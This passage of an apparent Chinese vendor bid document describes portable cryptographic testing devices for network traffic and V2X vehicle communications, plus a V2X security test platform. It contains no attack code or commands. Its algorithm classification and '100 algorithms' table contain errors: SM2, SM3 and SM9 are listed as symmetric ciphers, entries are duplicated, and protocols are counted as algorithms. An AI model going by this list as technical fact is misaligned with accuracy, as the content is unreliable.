class="headerlink" title="网络传输密码检测仪方案设计"></a>网络传输密码检测仪方案设计</h4><ol><li>确定评估目标</li></ol><p>明确网络传输密码检测仪的目标和范围。确定要评估的密码算法和协议，例如TLS/SSL、IPsec等。了解密码算法和协议的安全性要求和应用场景，以确定评估的重点和覆盖范围。</p><ol><li>收集密码算法和协议规范</li></ol><p>收集密码算法和协议的规范和标准，例如TLS/SSL的RFC文档。深入了解算法和协议的工作原理、加密流程、密钥管理等关键方面。这些文档将成为评估和测试的重要依据。</p><ol><li>设计评估策略</li></ol><p>制定网络传输密码检测仪的评估策略和计划。确定评估的方法和技术，例如流量分析、协议解析、加密弱点检测等。考虑使用公开可用的密码分析工具、流量捕获工具或自研工具来辅助评估。</p><ol><li>确定评估场景</li></ol><p>基于密码算法和协议的规范和安全要求，确定网络传输密码检测仪的关键场景和使用情境。考虑不同的网络传输场景、协议版本、加密参数等。确保评估场景具有多样性和代表性，能够覆盖密码算法和协议的各个安全方面。</p><ol><li>执行密码检测</li></ol><p>根据评估策略和场景，执行网络传输密码检测。使用合适的工具和技术进行评估，对传输的加密流量进行分析、解密、检查弱点等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析密码检测的结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进密码算法和协议的实现和配置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成密码检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于相关团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>密码检测是一个持续的过程。建议定期进行密码检测，特别是在密码算法和协议有重大更新或变更时。跟踪密码算法和协议的安全标准和最佳实践，及时更新评估策略和方法。</p><h4 id="产品彩页-5"><a href="#产品彩页-5" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dcac993309ae6bcf0c7c48bc71077951.png"></p><h4 id="网络传输密码使用检测仪参数"><a href="#网络传输密码使用检测仪参数" class="headerlink" title="网络传输密码使用检测仪参数"></a>网络传输密码使用检测仪参数</h4><p>我司为本项目提供的该检测仪信息如下：</p><p>品牌：国利</p><p>型号：GLNET001</p><p>数量：1套</p><p>指标参数信息如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/465fa7ff3b59a0779967fa0bdfc53343.png" alt="IMG_256"></p><ol><li>便携式设备,体积0.005立方米，重量2KG，全触摸屏操作，无需键盘。外接显示接口：miniHDMI。</li><li>USB接口2个,网络接口2*10/100/1000M电口；</li><li>支持网络旁路方式接入被测系统，进行通信密码安全性检测；</li><li>支持网络透明桥接方式接入被测系统，进行通信密码安全性检测；</li><li>支持通过U盘导入pcap格式的网络报文，对其进行密码应用数据检测；</li><li>支持IPSECVPN、SSLVPN、TLCP、SSH、HTTPS、SSL/TLS的密码算法的识别与验证；</li><li>支持100种密码算法识别与检测，包含：SM1/SM2/SM3/SM4/SM9、RSA/ECC/DES/3DES/AES/MD5/SHA；</li><li>支持身份认证相关数据进行安全性测试。可以识别和验证身份认证阶段使用的密码算法，并且可以按照相关国密标准进行对识别的密码算法进行安全性测试；</li><li>支持密码应用的密码强度检测分析，包括素性检测、低指数攻击检测、随机数因子检测、不动点检测等；</li><li>支持密钥交换安全性测试。可以识别和验证密钥交换阶段使用的密码算法，并且可以按照相关国密标准进行对识别的密码算法进行安全性测试；</li><li>支持按照相关国密标准进行随机数测试，支持GM/T 0005-2021《随机性检测规范》中全部15项随机性检测方法；</li><li>支持对数字证书进行安全性测试及校验；</li><li>支持电子签章安全性测试；</li><li>支持数字信封数据安全性测试。</li></ol><h3 id="智能网联V2X密码应用安全检测工具"><a href="#智能网联V2X密码应用安全检测工具" class="headerlink" title="智能网联V2X密码应用安全检测工具"></a>智能网联V2X密码应用安全检测工具</h3><h4 id="智能网联V2X密码应用安全检测工具方案设计"><a href="#智能网联V2X密码应用安全检测工具方案设计" class="headerlink" title="智能网联V2X密码应用安全检测工具方案设计"></a>智能网联V2X密码应用安全检测工具方案设计</h4><ol><li>确定评估目标</li></ol><p>明确智能网联V2X密码应用安全检测工具的目标和范围。确定要评估的密码应用，例如V2X通信中使用的加密算法和协议。了解密码应用的安全性要求和应用场景，以确定评估的重点和覆盖范围。</p><ol><li>收集密码应用规范和标准：收集密码应用的规范和标准，例如IEEE 1609.2标准中定义的V2X通信安全机制。深入了解密码应用的工作原理、加密流程、密钥管理等关键方面。这些文档将成为评估和测试的重要依据。</li><li>设计评估策略：制定智能网联V2X密码应用安全检测工具的评估策略和计划。确定评估的方法和技术，例如协议解析、加密算法分析、密钥管理检查等。考虑使用公开可用的密码分析工具、协议分析工具或自研工具来辅助评估。</li></ol><p>该工具我们采用便携式设计，体积仅有0.005立方米，重量2KG，全触摸屏操作。覆盖GM/T 0005-2021《随机性检测规范》中全部15项随机性检测方法。同时配置了外接显示miniHDMI接口，USB接口及网口。可按照相关标准对车联网V2X证书进行检测，实现对国密算法与国际标准密码算法的识别与检测，满足车联网证书的注册信息、仿冒及应用证书的检测。</p><ol><li>确定评估场景：基于密码应用的规范和安全要求，确定智能网联V2X密码应用安全检测工具的关键场景和使用情境。考虑不同的V2X通信场景、协议版本、加密参数等。确保评估场景具有多样性和代表性，能够覆盖密码应用的各个安全方面。</li><li>执行密码应用安全检测：根据评估策略和场景，执行智能网联V2X密码应用安全检测。使用合适的工具和技术进行评估，对V2X通信中的密码应用进行解析、分析、检查安全性等活动。记录评估结果、问题和建议。</li></ol><p>满足身份认证阶段网络通信数据的安全性测试。可以识别和验证身份认证信息及身份认证阶段所使用的密码算法，并依据相关国家标准判断其身份认证过程设计是否有效，同时可按照相关国密标准进行对识别到的身份认证信息与密码算法进行安全性测试。</p><p>满足密钥交换阶段网络通信数据的安全性测试。可以识别和验证密钥交换阶段所使用的密码算法，判断其密钥安全性能，并且可以按照相关国密标准进行对识别的密码算法进行安全性测试。</p><p>满足密码应用的强度分析，方法均依据相关国家标准进行设计，包括素性测试（费马素性测试、Miller-Rabin素性测试）、低指数攻击测试（低加密指数攻击测试、低加密指数广播攻击测试、低解密指数攻击测试）、随机数因子测试、不动点测试、依赖性测试、频率测试、动向测试等。</p><ol><li>分析和改进：分析密码应用安全检测的结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进密码应用的实现和配置。持续改进评估策略和方法，以提高评估效果和准确性。</li><li>提供报告和建议：根据评估结果，生成密码应用安全检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于相关团队理解和采纳。</li><li>持续监测和更新：密码应用安全检测是一个持续的过程。建议定期进行密码应用安全检测，特别是在密码应用有重大更新或变更时。跟踪密码应用的安全标准和最佳实践，及时更新评估策略和方法。</li></ol><h4 id="产品彩页-6"><a href="#产品彩页-6" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/193418e3751324379daed899ae1fd776.png"></p><h4 id="智能网联V2X密码应用安全检测工具参数"><a href="#智能网联V2X密码应用安全检测工具参数" class="headerlink" title="智能网联V2X密码应用安全检测工具参数"></a>智能网联V2X密码应用安全检测工具参数</h4><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLv2x022</p><p>数量：1套</p><p>指标参数信息如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d023a56802d1f092e2267d2b197f7d07.png"></p><ol><li>便携式设备,体积0.005立方米，重量2KG，全触摸屏操作，无需键盘。外接显示接口：miniHDMI。</li><li>USB接口2个,网络接口2*10/100/1000M电口；</li><li>支持按照相关标准对车联网V2X证书进行检测；</li><li>支持对国密算法与国际标准密码算法的识别与检测；</li><li>支持对车联网注册证书的进行安全性分析；</li><li>支持对车联网假名证书的进行安全性分析；</li><li>支持对车联网应用证书的进行安全性分析；</li><li>支持对车联网安全消息的进行安全性分析；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/48d359695dfdaa2e97fec921d5610f6a.png"></p><ol><li>支持按照相关国密标准进行随机数测试，支持GM/T 0005-2021《随机性检测规范》中全部15项随机性检测方法。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/40e3d870958d3845658d2b5113e31418.png"></p><h3 id="密码应用漏洞扫描系统"><a href="#密码应用漏洞扫描系统" class="headerlink" title="密码应用漏洞扫描系统"></a>密码应用漏洞扫描系统</h3><h4 id="密码应用漏洞扫描系方案设计"><a href="#密码应用漏洞扫描系方案设计" class="headerlink" title="密码应用漏洞扫描系方案设计"></a>密码应用漏洞扫描系方案设计</h4><ol><li><p>设备概述</p><p>设备类型：便携式设备；</p><p>尺寸和重量：体积为0.005立方米，重量为2KG；</p><p>操作方式：全触摸屏操作，无需键盘；</p><p>外接接口：2个USB接口，2个10/100/1000M以太网口，1个miniHDMI显示接口。</p></li><li><p>网络扫描功能</p></li></ol><p>支持网络接入：能够通过有线网络接口主动扫描网络上的加密应用系统</p><ol><li><p>支持的密码算法识别与检测</p><p>支持100种密码算法的识别与检测，如SM1/SM2/SM3/SM4/SM9、RSA/ECC/DES/3DES/AES/MD5/SHA。其中：</p><p>对称加密算法：SM1、SM2、SM3、SM4、SM9、DES、3DES、AES</p><p>非对称加密算法：RSA、ECC</p><p>散列算法：MD5、SHA</p></li><li><p>弱算法检测分析</p></li></ol><p>支持对密码应用中使用的弱算法进行检测分析，识别容易受到攻击的算法，并提供相应的警告或建议。</p><ol><li>密码漏洞检测分析</li></ol><p>支持对密码应用中的密码漏洞进行检测分析，识别可能存在的漏洞，并提供相应的警告或建议。</p><ol><li>密码算法和密码套件检测分析</li></ol><p>支持对密码应用使用的密码算法和密码套件进行检测分析，确保其符合安全标准和最佳实践。</p><ol><li>算法曲线参数检测分析</li></ol><p>支持对密码应用中使用的算法曲线参数进行检测分析，确保其参数设置符合安全要求。</p><ol><li>密码前向安全性检查</li></ol><p>支持对密码应用的密码前向安全性进行检查，评估密码的保密性和完整性。</p><ol><li>安全性量化评估</li></ol><p>支持对密码应用的整体安全性进行量化评估，通过评分或指标来衡量密码应用的安全性水平。</p><ol><li>密码强度检测分析</li></ol><p>支持对密码应用的密码强度进行检测分析，包括素性检测、低指数攻击检测、随机数因子检测、不动点检测等。</p><h4 id="产品彩页-7"><a href="#产品彩页-7" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/82f20d399b0d8974dbe1c0bb52092eb9.png"></p><h4 id="密码应用漏洞扫描系统参数"><a href="#密码应用漏洞扫描系统参数" class="headerlink" title="密码应用漏洞扫描系统参数"></a>密码应用漏洞扫描系统参数</h4><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLSCNN12</p><p>数量：1套</p><p>指标参数信息如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c9c20fe678034e819d2591da5af239c0.png"></p><ol><li>便携式设备,体积0.005立方米，重量2KG，全触摸屏操作，无需键盘。外接显示接口：miniHDMI。</li><li>USB接口2个,网络接口2*10/100/1000M电口；</li><li>支持网络接入，主动扫描网络上加密应用系统；</li><li>支持100种密码算法识别与检测，包含：SM1/SM2/SM3/SM4/SM9、RSA/ECC/DES/3DES/AES/MD5/SHA。100种算法如下：</li></ol><table><thead><tr><th><strong>序号</strong></th><th><strong>算法名称</strong></th><th><strong>序号</strong></th><th><strong>算法名称</strong></th></tr></thead><tbody><tr><td>1</td><td>SM1</td><td>51</td><td>ChaCha20</td></tr><tr><td>2</td><td>SM2</td><td>52</td><td>Poly1305</td></tr><tr><td>3</td><td>SM3</td><td>53</td><td>Curve25519</td></tr><tr><td>4</td><td>SM4</td><td>54</td><td>Curve448</td></tr><tr><td>5</td><td>SM9</td><td>55</td><td>Groestl (used in Groestlcoin)</td></tr><tr><td>6</td><td>RSA</td><td>56</td><td>JH</td></tr><tr><td>7</td><td>ECC (Elliptic Curve Cryptography)</td><td>57</td><td>Skein</td></tr><tr><td>8</td><td>DES (Data Encryption Standard)</td><td>58</td><td>Keccak (basis for SHA-3)</td></tr><tr><td>9</td><td>3DES (Triple Data Encryption Algorithm)</td><td>59</td><td>LOKI97</td></tr><tr><td>10</td><td>AES (Advanced Encryption Standard)</td><td>60</td><td>MAGENTA</td></tr><tr><td>11</td><td>MD5 (Message Digest Algorithm 5)</td><td>61</td><td>MARS (IBM’s candidate for AES)</td></tr><tr><td>12</td><td>SHA-1 (Secure Hash Algorithm 1)</td><td>62</td><td>NOEKEON</td></tr><tr><td>13</td><td>SHA-256</td><td>63</td><td>SEED (a block cipher developed by KISA)</td></tr><tr><td>14</td><td>SHA-512</td><td>64</td><td>SHACAL-2</td></tr><tr><td>15</td><td>SHA-3</td><td>65</td><td>SOSEMANUK</td></tr><tr><td>16</td><td>Blowfish</td><td>66</td><td>SQUARE</td></tr><tr><td>17</td><td>Twofish</td><td>67</td><td>UMAC (Universal Message Authentication Code)</td></tr><tr><td>18</td><td>Serpent</td><td>68</td><td>VMAC (Vector Message Authentication Code)</td></tr><tr><td>19</td><td>RC4 (Rivest Cipher 4)</td><td>69</td><td>XMACC</td></tr><tr><td>20</td><td>RC5</td><td>70</td><td>TTM (Two to Mango)</td></tr><tr><td>21</td><td>RC6</td><td>71</td><td>HC-128</td></tr><tr><td>22</td><td>IDEA (International Data Encryption Algorithm)</td><td>72</td><td>HC-256</td></tr><tr><td>23</td><td>CAST5</td><td>73</td><td>Panama</td></tr><tr><td>24</td><td>CAST6</td><td>74</td><td>Rabbit</td></tr><tr><td>25</td><td>Camellia</td><td>75</td><td>Sosemanuk</td></tr><tr><td>26</td><td>SEED</td><td>76</td><td>Anubis</td></tr><tr><td>27</td><td>Skipjack</td><td>77</td><td>Khazad</td></tr><tr><td>28</td><td>TEA (Tiny Encryption Algorithm)</td><td>78</td><td>Kuznyechik (GOST R 34.12-2015)</td></tr><tr><td>29</td><td>XTEA (eXtended Tiny Encryption Algorithm)</td><td>79</td><td>Streebog (GOST R 34.11-2012)</td></tr><tr><td>30</td><td>XXTEA (Corrected Block Tiny Encryption Algorithm)</td><td>80</td><td>FROG</td></tr><tr><td>31</td><td>Whirlpool</td><td>81</td><td>HIGHT</td></tr><tr><td>32</td><td>GOST (ГОСТ Р 34.11-94)</td><td>82</td><td>LEA</td></tr><tr><td>33</td><td>Tiger</td><td>83</td><td>SHARK</td></tr><tr><td>34</td><td>RIPEMD-160</td><td>84</td><td>Spectral Hash</td></tr><tr><td>35</td><td>RIPEMD-320</td><td>85</td><td>Tangle</td></tr><tr><td>36</td><td>MISTY1</td><td>86</td><td>Photon</td></tr><tr><td>37</td><td>MISTY2</td><td>87</td><td>Quark</td></tr><tr><td>38</td><td>KASUMI</td><td>88</td><td>SipHash</td></tr><tr><td>39</td><td>ARIA</td><td>89</td><td>Blake</td></tr><tr><td>40</td><td>CLEFIA</td><td>90</td><td>Blake2</td></tr><tr><td>41</td><td>HMAC (Hash-based Message Authentication Code)</td><td>91</td><td>Grøstl</td></tr><tr><td>42</td><td>PBKDF2 (Password-Based Key DerivationFunction 2)</td><td>92</td><td>JH (one of the five final SHA-3 candidates)</td></tr><tr><td>43</td><td>Argon2</td><td>93</td><td>Cramer-Shoup cryptosystem</td></tr><tr><td>44</td><td>Scrypt</td><td>94</td><td>McEliece cryptosystem</td></tr><tr><td>45</td><td>bcrypt</td><td>95</td><td>NewHope</td></tr><tr><td>46</td><td>ElGamal</td><td>96</td><td>NTRU</td></tr><tr><td>47</td><td>DSA (Digital Signature Algorithm)</td><td>97</td><td>OTR (Off-the-Record Messaging)</td></tr><tr><td>48</td><td>ECDSA (Elliptic Curve Digital Signature Algorithm)</td><td>98</td><td>PGP (Pretty Good Privacy)</td></tr><tr><td>49</td><td>EdDSA (Edwards-curve Digital Signature Algorithm)</td><td>99</td><td>Signal Protocol (used in Signal messaging app)</td></tr><tr><td>50</td><td>Salsa20</td><td>100</td><td>ZRTP (Zimmermann Real-time Transport Protocol)</td></tr></tbody></table><ol><li>支持对密码应用的弱算法进行检测分析；</li><li>支持对密码应用的密码漏洞进行检测分析；</li><li>支持检测分析密码应用使用的密码算法、密码套件；</li><li>支持检测分析密码应用全部算法曲线参数；</li><li>支持密码应用密码前向安全性检查；</li><li>支持对密码应用整体安全性进行量化评估；</li><li>支持密码应用的密码强度检测分析，包括素性检测、低指数攻击检测、随机数因子检测、不动点检测等。</li></ol><h1 id="智能汽车网络靶场工具库-V2X安全检测平台"><a href="#智能汽车网络靶场工具库-V2X安全检测平台" class="headerlink" title="智能汽车网络靶场工具库-V2X安全检测平台"></a>智能汽车网络靶场工具库-V2X安全检测平台</h1><h2 id="总体概述-1"><a href="#总体概述-1" class="headerlink" title="总体概述"></a>总体概述</h2><p>V2X安全检测平台主要实现对OBU、RSU及整车进行测试，以产品技术要求及标准要求为输入构建测试用例库，并支持将检测结果推送到外部平台。V2X安全演示系统与V2X安全检测平台相结合，对OBU与RSU实施攻防演示。测试用例以汽标委《基于LTE-V2X直连通信的车载信息交互系统技术要求》、CCSA《基于LTE的车联网通信按技术要求》、CCSA《基于LTE的车联网无线通信技术安全认证技术要求》等标准发布稿为输入，构建实验室测试用例库及外场测试用例库，并严格遵守和符合上述标准，进行相关测试。平台提供实验室演示功能，用于将V2X安全方案在实验室内进行展示，包括的内容有V2X安全方案的理论演示、V2X应景演示、V2X虚构车辆攻击与防御、V2X需求限速工具与防御等场景。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/1a56139bd0e7d65d2a97dfee166bb94a.png"></p><p>V2X安全检测平台测试框架</p><h2 id="V2X安全检测平台方案"><a href="#V2X安全检测平台方案" class="headerlink" title="V2X安全检测平台方案"></a>V2X安全检测平台方案</h2><p>V2X安全检测平台包含测试用例库、测试控制系统、测试环境基础平台、测试模拟系统、测试系统管理模块、测试系统执行模块、测试系统报告生成模块的功能。V2X安全检测平台各模块功能具体描述如下。</p><h3 id="测试控制系统"><a href="#测试控制系统" class="headerlink" title="测试控制系统"></a>测试控制系统</h3><h4 id="工程向导"><a href="#工程向导" class="headerlink" title="工程向导"></a>工程向导</h4><p>工程向导支持新建工程，组织和管理资源的功能。当通过工程向导创建新的工程项目时，系统自动解压资源模板包，并且生成工程项目目录。支持工程项目中使用C++语言开发相应的被测系统适配器和编码解码器。</p><p>工程向导是一个为用户提供创建和管理工程项目的强大工具，它简化了项目的初始设置和资源管理过程。通过工程向导，用户可以轻松启动新的工程项目，无需手动创建和配置复杂的项目结构。当用户启动工程向导并选择新建工程项目时，工程向导会引导用户通过几个简单的步骤，如输入项目名称、选择项目类型和配置基本参数。</p><p>一旦这些初步信息被确认，系统将自动执行资源模板包的解压操作。这个资源模板包含了所有必要的文件和目录结构，它们是预先设计好的，符合特定类型的工程项目标准。这些模板可能包括基础的源代码文件、项目配置文件、库文件、文档模板以及其他必要的资源。这一自动化步骤大大节省了用户的时间，避免了在项目建立过程中可能出现的错误。</p><p>一旦资源模板包被解压，工程项目目录将被生成。这个目录结构是精心组织的，以确保项目的各个组成部分都能被适当地分类和存取。这包括源代码目录、头文件目录、资源文件目录、构建脚本目录等。这样的组织使得项目易于管理和维护，同时也便于团队协作和版本控制。</p><p>此外，工程向导还支持使用C++语言开发的工程项目，这对于需要高性能和系统级编程的工程尤为关键。用户可以在工程项目中开发被测系统适配器和编码解码器，这些是软件测试和系统集成中不可或缺的组件。被测系统适配器允许工程项目与外部系统或硬件接口，而编码解码器则负责处理数据的编码和解码工作，确保数据的正确传输和解释。</p><p>通过工程向导，开发者不仅能够快速搭建起工程项目的框架，还能确保项目结构的一致性和标准化。这样的工具不仅提高了开发效率，还减少了在项目初期可能发生的配置错误，为后续的开发工作奠定了坚实的基础。</p><h4 id="核心编辑器"><a href="#核心编辑器" class="headerlink" title="核心编辑器"></a>核心编辑器</h4><p>核心编辑器支持提供标准的文本编辑功能，例如打开/保存、复制/粘贴、查找/替换等。还提供对用户友好的附加功能，如可配置的语法高亮显示、代码折叠、内容助手、文本格式化、内容大纲、代码模板和语义检查器等。</p><p>核心编辑器是软件开发环境中的关键组件，它提供了一系列标准和高级的文本编辑功能，旨在提高开发人员的工作效率和代码质量。基础功能包括打开和保存文件，这是编辑器的基本要求，允许用户加载现有代码或文本文件到编辑器中进行修改，并保存更改。复制和粘贴功能使得用户可以轻松地在文档中或跨文档复制文本，而查找和替换功能则提供了一个快速定位和修改特定字符串的有效手段。</p><p>除了这些标准功能之外，核心编辑器还提供了一系列用户友好的附加功能，以进一步提升用户体验。可配置的语法高亮显示是其中一个特色功能，它根据不同的编程语言语法规则，以不同的颜色和样式突出显示代码，使得阅读和理解代码更加简单直观。代码折叠功能允许用户隐藏或显示代码块，这在处理大型文件时特别有用，因为它可以帮助用户专注于当前正在编辑的代码段。</p><p>内容助手是一种智能提示工具，它在编写代码时提供自动完成、参数信息和成员列表，极大地提高了编码速度和准确性。文本格式化功能自动调整代码的缩进和对齐，保持代码的整洁和一致性。内容大纲提供了文档结构的鸟瞰图，让用户能够快速导航到代码的不同部分。</p><p>代码模板是预定义的代码片段，用户可以通过简单的触发词来插入常用的代码结构，从而节省时间并减少重复性工作。最后，语义检查器则是一个强大的工具，它超越了简单的语法高亮显示，能够理解代码的语义，检查潜在的逻辑错误、未定义的变量和类型不匹配等问题，帮助开发者在代码编写阶段就预防错误。</p><p>总而言之，核心编辑器通过集成这些功能，为用户提供了一个强大、灵活和高效的编码环境，使得代码的编写、修改和维护工作变得更加便捷和准确。</p><h4 id="底层资源库"><a href="#底层资源库" class="headerlink" title="底层资源库"></a>底层资源库</h4><p>底层资源库包含独立于实际测试套件的可以提前编译成二进制的手工编写的C++代码组成的公共和静态库部分。底层资源库包括表示基本数据类型的C++类和实现语言的内置操作的函数（例如定时器、端口、测试组件和判断处理）以及运行可执行测试套的其他辅助功能（例如日志和配置文件处理例程）。</p><p>底层资源库是软件测试框架中的核心组件，它提供了一系列预先编写好的、可复用的代码库，这些代码库是用C++编写的，并且可以独立于具体的测试套件存在。这些资源库的主要目的是为了提供一个稳定和高效的基础，以支持上层的测试套件运行。</p><p>由于这些库是用C++编写的，它们可以在使用前编译成二进制形式，这意味着它们在测试执行时的性能非常高，因为已经是编译好的机器代码。这种预编译的方法可以显著减少测试执行时的延迟，因为避免了在测试时进行即时编译的需要。</p><p>底层资源库包含了多个关键部分：</p><p>1. 公共和静态库：这些库包含了可以在多个测试套件之间共享的代码，这样的设计减少了代码重复，并且使得维护更为简单。静态库是在编译时链接到测试套件中的，它们成为了最终测试应用程序的一部分。</p><p>2. 基本数据类型的C++类：这些类表示了编程语言中的基本数据类型，并且可能提供了额外的功能，比如数据验证或者特殊的数据操作，这些操作在标准C++库中可能不可用。</p><p>3. 内置操作的函数：这些函数实现了语言的基本操作，比如定时器（用于控制测试的时间敏感部分）、端口（用于与被测试系统交互的接口）、测试组件（用于构建测试用例的基本构建块）和判断处理（用于评估测试结果是否符合预期）。</p><p>4.其他辅助功能：为了支持测试套的运行，底层资源库还包括了其他辅助功能，比如日志处理例程（用于记录测试过程中的各种事件），配置文件处理例程（用于读取和解析配置文件中的设置），这些功能对于管理测试流程和结果分析至关重要。</p><p>通过将这些底层的、通用的、性能优化的代码组件封装在资源库中，测试开发人员可以更加专注于具体的测试逻辑和测试用例的实现。这种分层的架构设计不仅提高了代码的复用性，还降低了测试系统的复杂性，使得测试的开发和维护更加高效。</p><h4 id="测试组件设计-amp-执行模块"><a href="#测试组件设计-amp-执行模块" class="headerlink" title="测试组件设计&amp;执行模块"></a>测试组件设计&amp;执行模块</h4><p>测试组件设计&amp;执行模块支持为测试系统提供控制中心和UI展现功能。实现各设备运行、系统自检以及可执行测试用例的运行，并且通过TCI命令接口对IUT实现自动化测试及控制。</p><p>测试组件设计&amp;执行模块是测试系统中的关键部分，它扮演着控制中心的角色，并提供用户界面（UI）以便于用户与测试系统交互。该模块的设计和实现关乎整个测试系统的效率和易用性。</p><p>控制中心：作为测试系统的神经中枢，控制中心负责协调和管理测试流程。它需要能够启动和停止测试，处理测试用例的加载、执行和调度，以及监控测试的进度。控制中心还需具备故障检测和恢复功能，以确保测试能够在出现问题时能够恰当地处理，并尽可能地自动化。</p><p>UI展现功能：用户界面为用户提供了一个直观的操作平台，使他们能够轻松地配置测试参数、启动和停止测试、查看测试进度和结果。一个好的UI设计可以大大提高用户的工作效率，尤其是在复杂的测试场景中。用户界面可能包括仪表板、日志窗口、测试用例编辑器、结果展示器等组件。</p><p>设备运行和系统自检：测试组件设计&amp;执行模块需要能够管理各个测试设备的运行状态，包括硬件设备和软件应用。在测试开始之前，模块应能执行系统自检，确保所有设备均处于良好状态，准备就绪，这包括检查网络连接、设备响应以及必要的服务是否运行等。</p><p>可执行测试用例的运行：该模块需要支持加载和执行具体的测试用例，包括单个测试用例和测试序列。它应能够处理并发执行、测试优先级和依赖管理，同时提供足够的灵活性以支持不同类型的测试策略。</p><p>TCI命令接口：测试控制接口（TCI）是一个标准的接口，允许测试组件设计&amp;执行模块通过编程方式与被测系统（IUT）进行交互。通过TCI，模块可以发送命令以控制IUT，实现自动化测试。这包括启动和停止IUT上的进程、设置和查询参数、以及收集测试结果等。</p><p>自动化测试及控制：自动化是现代测试系统的核心特性。测试组件设计&amp;执行模块应该能够自动执行测试案例，无需人工干预，从而提高测试的效率和可靠性。自动化控制包括对测试流程的控制、测试数据的生成和处理，以及测试结果的收集和分析。</p><p>综上所述，测试组件设计&amp;执行模块的实现需要综合考虑用户操作的便捷性、测试流程的自动化和测试结果的准确性，以确保整个测试系统能够高效、稳定地运行。</p><h3 id="测试环境基础平台"><a href="#测试环境基础平台" class="headerlink" title="测试环境基础平台"></a>测试环境基础平台</h3><h4 id="V2X数据模拟"><a href="#V2X数据模拟" class="headerlink" title="V2X数据模拟"></a>V2X数据模拟</h4><p>V2X数据模拟支持LTE-PC5数据模拟，满足LTE-V2X网络数据收发模拟实现。</p><p>V2X（车联网）数据模拟是指模拟车辆之间或车辆与基础设施之间的通信数据交互过程，以便进行车联网系统的测试、验证和性能评估。V2X数据模拟旨在模拟实际交通场景中的各种通信事件和情况，以生成真实的V2X数据流，供系统开发人员和测试人员使用。</p><p>以下是对V2X数据模拟的一般描述：</p><p>数据生成：V2X数据模拟需要生成各种类型的数据，包括车辆信息、位置信息、传感器数据、交通事件等。这些数据可以通过模拟算法、仿真模型或真实数据采集来生成。</p><p>通信协议：V2X数据模拟需要遵循车联网通信协议，如IEEE 802.11p/WAVE（无线接入于车辆环境）或LTE-V2X（基于LTE的车联网通信）。模拟的数据应符合相应的协议规范和数据格式。</p><p>交通场景模拟：V2X数据模拟应考虑不同的交通场景，包括城市道路、高速公路、交叉口等。模拟的数据包括车辆之间的通信、车辆与基础设施之间的通信，以及车辆与行人或其他障碍物之间的交互。</p><p>时空关系：V2X数据模拟需要考虑数据在时间和空间上的关系。模拟的数据应具有合理的时间戳和位置信息，以便准确地模拟车辆之间的通信和交互。</p><p>数据多样性：V2X数据模拟涵盖各种不同类型的数据，以测试和评估车联网系统的性能和鲁棒性。这包括不同类型的车辆、不同的交通状况、不同的通信范围和信号强度等。</p><p>数据量和速率：V2X数据模拟需要考虑生成大规模的数据，并模拟不同的数据传输速率和通信频率。用于评估车联网系统在不同负载和网络条件下的性能和可靠性。</p><p>数据验证和分析：V2X数据模拟生成的数据应进行验证和分析，以确保其与实际情况的一致性和准确性。包括数据质量检查、通信消息的解析和验证、事件触发的正确性等。</p><h4 id="驾驶数据模拟"><a href="#驾驶数据模拟" class="headerlink" title="驾驶数据模拟"></a>驾驶数据模拟</h4><p>驾驶数据模拟支持实验室测试和外场测试两个场景：</p><p>（1）在外场测试中，车辆使用卫星定位信号，根据测试用例需求进行驾驶行为指引，在外场测试场地中行驶，完成测试执行。</p><p>（2）实验室测试中，支持GNSS信号放大器为部件通信模组工作提供必要的卫星信号，完成对OBU、RSU部件的测试。</p><p>驾驶数据模拟是指在实验室测试和外场测试两个场景下，通过模拟驾驶行为和交通场景，生成真实的驾驶数据，以进行系统开发、测试和评估。</p><p>实验室测试场景：</p><p>- 环境模拟：在实验室中，可以使用驾驶模拟器或虚拟现实技术来模拟不同的驾驶环境，包括城市道路、高速公路、交叉口等。模拟的环境可以具有多样性，以涵盖不同的交通状况和驾驶挑战。</p><p>- 驾驶行为模拟：通过模拟器或虚拟现实技术，可以模拟真实驾驶中的各种行为，如加速、刹车、转向、变道等。模拟的驾驶行为应具有真实性和多样性，以覆盖不同的驾驶风格和行为模式。</p><p>- 传感器数据模拟：在实验室测试中，可以通过传感器模拟器来生成各种传感器数据，如摄像头图像、雷达数据、激光雷达数据等。这些数据可以用于测试和评估驾驶辅助系统或自动驾驶系统的感知和决策能力。</p><p>- 系统性能评估：通过实验室测试，可以评估驾驶辅助系统或自动驾驶系统在各种驾驶场景下的性能和鲁棒性。可以通过模拟不同的驾驶情况和故障情况，来测试系统的响应能力和容错能力。</p><p>外场测试场景：</p><p>- 实际道路测试：在外场测试中，可以将测试车辆装备传感器和数据采集设备，进行实际道路测试。测试车辆可以驾驶在真实的交通环境中，采集真实的驾驶数据和传感器数据。</p><p>- 数据记录和分析：外场测试中，测试车辆会记录驾驶数据和传感器数据，包括车辆状态、位置信息、传感器输出等。这些数据可以后续进行分析，评估系统的性能、安全性和可靠性。</p><p>- 